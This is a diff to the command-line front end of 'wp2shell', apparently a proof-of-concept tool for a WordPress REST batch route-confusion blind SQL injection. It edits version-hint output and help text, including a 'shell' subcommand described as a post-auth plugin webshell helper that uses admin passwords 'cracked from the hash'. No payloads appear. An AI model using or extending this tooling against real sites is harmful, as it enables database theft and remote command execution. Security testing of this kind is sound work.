@@ -11,7 +11,7 @@ from . import __version__
 from .client import BatchClient
 from .shell import AdminSession
 from .sqli import BlindSQLi
-from .version import public_version_hints
+from .version import public_version_hints, version_status
 
 try:
     import readline  # noqa: F401 - enables line editing/history for the interactive prompt
@@ -77,10 +77,12 @@ def _print_version_hints(client: BatchClient) -> None:
 
     info("Public WordPress version hints:")
     for hint in hints:
-        status = "affected range" if hint.affected else "not in affected ranges"
-        print(f"    - {hint.version} via {hint.source} ({status}) - {_short(hint.detail)}")
+        print(
+            f"    - {hint.version} via {hint.source} "
+            f"({version_status(hint.version)}) - {_short(hint.detail)}"
+        )
     if any(hint.affected for hint in hints):
-        warn("A public version hint falls in the affected range; verify internally or confirm with authorization.")
+        warn("A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.")
 
 
 # -- commands ---------------------------------------------------------------
@@ -246,7 +248,7 @@ def _add_common(parser: argparse.ArgumentParser) -> None:
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="wp2shell",
-        description="WordPress REST batch route-confusion SQLi/RCE PoC (CVE-2026-63030).",
+        description="WordPress REST batch route-confusion SQLi PoC associated with wp2shell.",
     )
     parser.add_argument("--version", action="version", version=f"wp2shell {__version__}")
     sub = parser.add_subparsers(dest="command", required=True)
@@ -276,7 +278,7 @@ def build_parser() -> argparse.ArgumentParser:
     read.add_argument("--max-length", type=int, default=128, help="max characters per value")
     read.set_defaults(func=cmd_read)
 
-    shell = sub.add_parser("shell", help="execute a command (requires admin credentials)")
+    shell = sub.add_parser("shell", help="post-auth plugin webshell helper")
     _add_common(shell)
     shell.add_argument("--user", required=True, help="admin username")
     shell.add_argument("--password", required=True, help="admin password (cracked from the hash)")
